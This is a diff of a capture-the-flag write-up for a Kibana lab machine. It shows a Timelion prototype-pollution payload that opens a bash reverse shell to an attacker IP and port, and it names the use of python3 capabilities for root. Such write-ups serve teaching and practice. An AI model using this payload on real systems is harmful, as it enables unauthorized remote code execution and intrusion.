@@ -6,7 +6,7 @@
 
 ## nmap
 
-> The service on 5601 is kibana
+> The service on `5601` is `kibana`
 
 ![](images/nmap.png)
 
@@ -24,7 +24,7 @@
 
 ## reverse shell
 
-> Exploit the Timelion section using prototype pollution to execute the reverse shell and get the user account
+> Exploit the `Timelion` section using `prototype pollution` to execute the reverse shell and get the user account
 ```javascript
 .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.11.19.194/1337 0>&1\'");//')
 .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
@@ -40,11 +40,11 @@
 
 ## PrivEsc
 
-> List programs with capabilities set
+> List programs with `capabilities` set
 
 ![](images/caps.png)
 
-> Exploit the python3 capabilities to get root
+> Exploit the fact that `python3` has `SUID capabilities` set to get root.
 
 ![](images/root.png)
 
